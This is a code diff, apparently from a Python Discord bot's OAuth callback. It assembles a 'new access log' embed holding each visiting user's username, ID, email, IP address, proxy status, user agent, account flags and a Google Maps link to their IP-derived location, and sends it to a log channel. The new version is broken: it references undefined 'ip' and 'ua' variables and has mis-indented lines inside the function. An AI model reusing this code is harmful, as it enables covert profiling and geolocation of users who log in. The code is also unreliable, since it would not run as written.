@@ -163,29 +163,25 @@ def callback():
         ip_info = structured_data["ip_info"]
         ua_info = structured_data["user_agent"]
 
-        embed_data = {
-            "title": "✅ 新しいアクセスログ",
-            "fields": [
-                {"name": "👤 Username", "value": f"{d['username']}#{d['discriminator']}", "inline": True},
-                {"name": "🆔 User ID", "value": d['id'], "inline": True},
-                {"name": "📧 Email", "value": d.get("email", "不明"), "inline": True},
-                {"name": "🌐 IP Address", "value": ip_info['ip'], "inline": True},
-                {"name": "🧭 User Agent", "value": ua_info['raw'], "inline": False},
-                {"name": "✅ Verified", "value": str(d.get("verified", False)), "inline": True},
-                {"name": "🌐 Locale", "value": d.get("locale", "不明"), "inline": True},
-                {"name": "🏅 Premium Type", "value": str(d.get("premium_type", "なし")), "inline": True},
-                {"name": "🚩 Flags", "value": str(d.get("flags", "なし")), "inline": True},
-                {"name": "👥 Public Flags", "value": str(d.get("public_flags", "なし")), "inline": True},
-                {"name": "📍 Location", "value": f"{ip_info['country']} / {ip_info['region']} / {ip_info['city']} / {ip_info['zip']}", "inline": False},
-                {"name": "ISP / AS", "value": f"{ip_info['isp']} / {ip_info['as']}", "inline": True},
-                {"name": "Proxy / Hosting", "value": f"{ip_info['proxy']} / {ip_info['hosting']}", "inline": True},
-                {"name": "Device", "value": f"{ua_info['device']} / OS: {ua_info['os']} / Browser: {ua_info['browser']}", "inline": False},
-                {"name": "📍 Map", "value": f"[Google Map](https://www.google.com/maps?q={ip_info['lat']},{ip_info['lon']})", "inline": False}
-            ],
-            "thumbnail": {"url": d["avatar_url"]}
-        }
+        embed = {
+    "title": "✅ 新しいアクセスログ",
+    "thumbnail": {"url": d.get("avatar_url")},
+    "fields": [
+        {"name": "👤 Username", "value": f"{d.get('username')}#{d.get('discriminator')}", "inline": True},
+        {"name": "🆔 User ID", "value": d.get("id"), "inline": True},
+        {"name": "📧 Email", "value": d.get("email", "不明"), "inline": False},
+        {"name": "🌐 IP Address", "value": f"{ip.get('ip')} (Proxy: {ip.get('proxy')})", "inline": False},
+        {"name": "🧭 User Agent", "value": ua.get("raw"), "inline": False},
+        {"name": "✅ Verified", "value": str(d.get("verified")), "inline": True},
+        {"name": "🌐 Locale", "value": d.get("locale"), "inline": True},
+        {"name": "🏅 Premium Type", "value": str(d.get("premium_type", "なし")), "inline": True},
+        {"name": "🚩 Flags", "value": str(d.get("flags", 0)), "inline": True},
+        {"name": "👥 Public Flags", "value": str(d.get("public_flags", 0)), "inline": True},
+        {"name": "📍 Map", "value": f"[地図リンク](https://www.google.com/maps?q={ip.get('lat')},{ip.get('lon')})", "inline": False}
+    ]
+}
+bot.loop.create_task(bot.send_log(embed=embed))
 
-        bot.loop.create_task(bot.send_log(embed=embed_data))
 
         if ip_info["proxy"] or ip_info["hosting"]:
             bot.loop.create_task(bot.send_log(
